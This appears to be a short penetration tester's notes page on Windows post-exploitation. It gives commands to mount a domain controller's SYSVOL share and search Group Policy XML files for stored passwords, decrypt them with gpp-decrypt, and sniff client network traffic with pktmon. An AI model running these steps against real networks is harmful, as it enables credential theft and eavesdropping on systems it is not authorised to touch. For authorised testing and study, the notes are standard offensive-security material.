> Windows Specific knowledge not covered in the other sections

A note: this information should be combined with [[Network Security/Post Exploitation]]

## On the client

> Approaches to gather information on the client.

### Domain context

> If the client is in a domain, Group Policies are applied and may contain information (historic data may remain on the `sysvol` share)

- Mount the share and check the files (has to be done on a shell not meterpreter!):

```cmd
# Mount
net use X: \\%LOGONSERVER%\SysVol  # LOGONSERVER is a domain controller

# Switch the volume
X:

# enter the GPO folder
cd domain.local\Policies
dir

# Search for xml files (may contain interesting things)
dir /s *.xml
```

Decrypt passwords contained in the GPO files on your kali machine:

```bash
gpp-decrypt <yourStolenEncryptedPasswordHere>
```


### Local Context

> Show local information of the client

- sniff for interesting network traffic with `pktmon` [SOURCE](https://www.scip.ch/?labs.20200820)

Probably requires administrator privileges, also the service may need to be startet via `sc start pktmon`

```powershell
pktmon comp list  # List interfaces for ID in later context
pktmon start --etw -c 1 -p 0 -k 0x010 -l multi-file  # c-> ID des interface

# windows 10 valid:
pktmon start --etw -c --comp 1 --pkt-size 0 --flags 0x010
pktmon stop  # otherwhise file is not written if in circular mode...

# morph to pcap
pktmon pcapng file.etl -o file.pcapng
```
